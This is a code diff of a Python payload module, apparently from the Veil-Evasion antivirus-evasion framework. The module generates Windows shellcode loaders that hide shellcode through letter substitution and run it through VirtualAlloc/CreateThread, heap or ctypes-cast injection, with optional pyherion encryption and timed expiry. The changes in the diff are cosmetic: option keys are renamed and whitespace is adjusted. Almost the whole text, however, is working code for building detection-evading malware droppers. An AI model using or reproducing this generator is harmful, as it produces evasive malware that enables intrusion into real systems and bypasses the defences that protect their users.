@@ -24,22 +24,24 @@ from modules.common import encryption
 
 
 class Payload:
-    
+
     def __init__(self):
         # required options
         self.description = "A letter used in shellcode is replaced with a different letter. At runtime, the exe reverses the letter substitution and executes the shellcode"
         self.language = "python"
         self.rating = "Excellent"
         self.extension = "py"
-        
+
         self.shellcode = shellcode.Shellcode()
 
-        # options we require user interaction for- format is {Option : [Value, Description]]}
-        self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
-                                 "use_pyherion" : ["N", "Use the pyherion encrypter"],
-                                 "inject_method" : ["Virtual", "Virtual, Heap, or Void"],
-                                 "expire_payload" : ["X", "Optional: Payloads expire after \"X\" days"]}
-    
+        # options we require user interaction for- format is {OPTION : [Value, Description]]}
+        self.required_options = {
+                                    "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
+                                    "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
+                                    "INJECT_METHOD"  : ["Virtual", "Virtual, Heap, or Void"],
+                                    "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days (\"X\" disables feature)"]
+                                }
+
     def generate(self):
         #Random letter substition variables
         hex_letters = "abcdef"
@@ -66,8 +68,8 @@ class Payload:
         # Escaping Shellcode
         Shellcode = Shellcode.encode("string_escape")
 
-        if self.required_options["inject_method"][0].lower() == "virtual":
-            if self.required_options["expire_payload"][0].lower() == "x":
+        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
+            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
 
                 # Create Payload File
                 payload_code = 'import ctypes as avlol\n'
@@ -84,16 +86,16 @@ class Payload:
                 payload_code += rand_ht + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + rand_ptr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                 payload_code += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + rand_ht + '),avlol.c_int(-1))\n'
 
-                if self.required_options["use_pyherion"][0].lower() == "y":
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     payload_code = encryption.pyherion(payload_code)
-            
+
                 return payload_code
 
             else:
 
                 # Get our current date and add number of days to the date
                 todaysdate = date.today()
-                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
+                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
 
                 # Extra Variables
                 RandToday = helpers.randomString()
@@ -119,13 +121,13 @@ class Payload:
                 payload_code += '\t' + rand_ht + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + rand_ptr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                 payload_code += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + rand_ht + '),avlol.c_int(-1))\n'
 
-                if self.required_options["use_pyherion"][0].lower() == "y":
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     payload_code = encryption.pyherion(payload_code)
-            
+
                 return payload_code
 
-        if self.required_options["inject_method"][0].lower() == "heap":
-            if self.required_options["expire_payload"][0].lower() == "x":
+        if self.required_options["INJECT_METHOD"][0].lower() == "heap":
+            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
 
                 HeapVar = helpers.randomString()
 
@@ -146,16 +148,16 @@ class Payload:
                 payload_code += rand_ht + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + rand_ptr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                 payload_code += 'avlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + rand_ht + '),avlol.c_int(-1))\n'
 
-                if self.required_options["use_pyherion"][0].lower() == "y":
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     payload_code = encryption.pyherion(payload_code)
-            
+
                 return payload_code
 
             else:
 
                 # Get our current date and add number of days to the date
                 todaysdate = date.today()
-                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
+                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
 
                 # Extra Variables
                 RandToday = helpers.randomString()
@@ -184,13 +186,13 @@ class Payload:
                 payload_code += '\t' + rand_ht + ' = avlol.windll.kernel32.CreateThread(avlol.c_int(0),avlol.c_int(0),avlol.c_int(' + rand_ptr + '),avlol.c_int(0),avlol.c_int(0),avlol.pointer(avlol.c_int(0)))\n'
                 payload_code += '\tavlol.windll.kernel32.WaitForSingleObject(avlol.c_int(' + rand_ht + '),avlol.c_int(-1))\n'
 
-                if self.required_options["use_pyherion"][0].lower() == "y":
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     payload_code = encryption.pyherion(payload_code)
-            
+
                 return payload_code
 
         else:
-            if self.required_options["expire_payload"][0].lower() == "x":
+            if self.required_options["EXPIRE_PAYLOAD"][0].lower() == "x":
 
                 #Additional random variable names
                 rand_reverse_shell = helpers.randomString()
@@ -209,8 +211,8 @@ class Payload:
                 payload_code += rand_memory_shell + ' = create_string_buffer(' + subbed_shellcode_variable_name + ', len(' + subbed_shellcode_variable_name + '))\n'
                 payload_code += rand_shellcode + ' = cast(' + rand_memory_shell + ', CFUNCTYPE(c_void_p))\n'
                 payload_code += rand_shellcode + '()'
-    
-                if self.required_options["use_pyherion"][0].lower() == "y":
+
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     payload_code = encryption.pyherion(payload_code)
 
                 return payload_code
@@ -219,7 +221,7 @@ class Payload:
 
                 # Get our current date and add number of days to the date
                 todaysdate = date.today()
-                expiredate = str(todaysdate + timedelta(days=int(self.required_options["expire_payload"][0])))
+                expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))
 
                 # Extra Variables
                 RandToday = helpers.randomString()
@@ -249,7 +251,7 @@ class Payload:
                 payload_code += '\t' + rand_shellcode + '()'
 
 
-                if self.required_options["use_pyherion"][0].lower() == "y":
+                if self.required_options["USE_PYHERION"][0].lower() == "y":
                     payload_code = encryption.pyherion(payload_code)
 
                 return payload_code
